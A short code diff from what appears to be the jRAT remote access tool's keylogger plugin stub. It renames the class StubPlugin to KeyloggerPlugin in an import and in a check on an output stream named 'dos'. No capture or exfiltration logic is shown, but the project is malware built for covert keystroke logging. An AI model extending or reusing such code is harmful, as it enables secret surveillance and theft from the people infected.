@@ -3,7 +3,7 @@ package se.jrat.plugin.keylogger.stub.activities;
 import java.util.ArrayList;
 import java.util.List;
 
-import se.jrat.plugin.keylogger.stub.StubPlugin;
+import se.jrat.plugin.keylogger.stub.KeyloggerPlugin;
 
 
 public class Activities {
@@ -20,7 +20,7 @@ public class Activities {
 			activities.add(activity);
 		}
 		
-		if (StubPlugin.dos != null) {
+		if (KeyloggerPlugin.dos != null) {
 			if (online.size() > 2500) {
 				online.clear();
 			}
